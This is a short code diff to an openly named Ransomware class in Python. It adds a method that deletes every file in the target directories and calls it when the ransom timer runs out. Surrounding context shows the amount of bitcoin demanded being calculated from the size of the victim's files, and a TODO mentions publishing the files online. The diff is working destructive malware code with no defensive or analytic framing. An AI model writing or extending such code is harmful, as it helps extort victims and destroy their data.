@@ -232,7 +232,12 @@ class Ransomware:
         
         self.calculate_and_send_bitcoin_needed(size_of_files)
 
-
+    def delete_all_files(self, directory):
+        dir_list = self.list_safe_directories(directory)
+        for dir in dir_list:
+            for file in self.get_files_in_dir(dir):
+                file_path=os.path.join(dir, file)
+                os.remove(file_path)
 
 
     def decrypt_file(self, file_path, key):
@@ -354,6 +359,7 @@ class Ransomware:
         else: # Timer has run out
             #TODO: Implement file deletion and internet publication code.
             print("timer ran out ")
+            self.delete_all_files(self._directory)
 
 
 
